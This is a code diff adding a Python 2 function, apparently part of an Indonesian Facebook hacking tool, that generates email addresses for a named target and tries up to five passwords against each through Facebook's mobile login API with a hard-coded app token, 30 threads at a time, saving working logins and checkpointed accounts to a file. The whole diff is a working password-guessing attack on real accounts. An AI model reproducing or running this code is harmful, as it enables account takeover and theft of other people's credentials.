@@ -463,6 +463,139 @@ def action():
 	raw_input('\033[1;96m[\033[1;97mKembali\033[1;96m]')
 	login()
 
+
+def crack_email():
+    os.system('clear')
+    print logo
+    try:
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Contoh\x1b[1;97m :\x1b[1;33m bagas.kurniwan '
+        c = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Nama Target\x1b[1;97m :\x1b[1;92m ')
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Example \x1b[1;97m: \x1b[1;33m@hotmail.com,@yahoo.com,@gmail.com'
+        k = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Domain Email\x1b[1;97m :\x1b[1;92m ')
+        print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Contoh \x1b[1;97m: \x1b[1;33mbagas123'
+        pass1 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password1\x1b[1;97m :\x1b[1;92m ')
+        pass2 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;90m Password2\x1b[1;97m :\x1b[1;92m ')
+        pass3 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password3\x1b[1;97m :\x1b[1;92m ')
+        pass4 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;90m Password4\x1b[1;97m :\x1b[1;92m ')
+        pass5 = raw_input('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Password5\x1b[1;97m :\x1b[1;92m ')
+        idlist = '..txt'
+        for line in open(idlist, 'r').readlines():
+            id.append(line.strip())
+
+    except IOError:
+        print '[!] File Not Found'
+        raw_input('\n[ Kembali ]')
+        menu()
+
+    xxx = str(len(id))
+    jalan('\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Total Email \x1b[1;97m:\x1b[1;92m ' + xxx)
+    time.sleep(1)
+    jalan("\x1b[1;97m[\x1b[1;92m!\x1b[1;97m] \x1b[1;97mJangan Keluar")
+    time.sleep(1)
+    titik = ['.   ', '..  ', '... ']
+    for o in titik:
+        print '\r\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m]\x1b[1;97m Proses Sedang Berlangsung ' + o,
+        sys.stdout.flush()
+        time.sleep(1)
+
+    print '\x1b[1;97m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            w = json.load(data)
+            if 'access_token' in w:
+                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass1
+                okb = open('save/email.txt', 'a')
+                okb.write('[Berhasil] ' + c + user + k + ' | ' + pass1 + '\n')
+                okb.close()
+                oks.append(user + pass1)
+            elif 'www.facebook.com' in w['error_msg']:
+                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass1
+                cps = open('save/email.txt', 'a')
+                cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass1 + '\n')
+                cps.close()
+                cekpoint.append(user + pass1)
+            else:
+                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                w = json.load(data)
+                if 'access_token' in w:
+                    print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass2
+                    okb = open('save/email.txt', 'a')
+                    okb.write('[Berhasil] ' + c + user + k + ' | ' + pass2 + '\n')
+                    okb.close()
+                    oks.append(user + pass2)
+                elif 'www.facebook.com' in w['error_msg']:
+                    print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass2
+                    cps = open('save/email.txt', 'a')
+                    cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass2 + '\n')
+                    cps.close()
+                    cekpoint.append(user + pass2)
+                else:
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    w = json.load(data)
+                    if 'access_token' in w:
+                        print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass3
+                        okb = open('save/email.txt', 'a')
+                        okb.write('[Berhasil] ' + c + user + k + ' | ' + pass3 + '\n')
+                        okb.close()
+                        oks.append(user + pass3)
+                    elif 'www.facebook.com' in w['error_msg']:
+                        print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass3
+                        cps = open('save/email.txt', 'a')
+                        cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass3 + '\n')
+                        cps.close()
+                        cekpoint.append(user + pass3)
+                    else:
+                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                        w = json.load(data)
+                        if 'access_token' in w:
+                            print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass4
+                            okb = open('save/email.txt', 'a')
+                            okb.write('[Berhasil] ' + c + user + k + ' | ' + pass4 + '\n')
+                            okb.close()
+                            oks.append(user + pass4)
+                        elif 'www.facebook.com' in w['error_msg']:
+                            print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass4
+                            cps = open('save/email.txt', 'a')
+                            cps.write('[Cekpoint] ' + c + user + k + ' | ' + pass4 + '\n')
+                            cps.close()
+                            cekpoint.append(user + pass4)
+                        else:
+                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + k + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                            w = json.load(data)
+                            if 'access_token' in w:
+                                print '\x1b[1;97m[\x1b[1;92mHACK\x1b[1;97m] ' + c + user + k + ' \x1b[1;92m|\x1b[1;97m ' + pass5
+                                okb = open('save/email.txt', 'a')
+                                okb.write('[Berhasil]' + c + user + k + ' | ' + pass5 + '\n')
+                                okb.close()
+                                oks.append(user + pass5)
+                            elif 'www.facebook.com' in w['error_msg']:
+                                print '\x1b[1;97m[\x1b[1;93mCHECK\x1b[1;97m] ' + c + user + k + ' \x1b[1;93m|\x1b[1;97m ' + pass5
+                                cps.open('save/email.txt', 'a')
+                                cps.write('[Cekpoint]' + c + user + k + ' | ' + pass5 + '\n')
+                                cps.close()
+                                cekpoint.append(user + pass5)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\x1b[1;97m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
+    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCrack Selesai ....'
+    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
+    print '\x1b[1;97m[\x1b[1;92m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mCP/OK tersimpan : save/email.txt'
+    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
+    raw_input('\x1b[1;97m[\x1b[1;92m BACK \x1b[1;97m]')
+    os.system('python2 clut.py')
+
+
 def menu():
 	os.system('clear')
 	try:
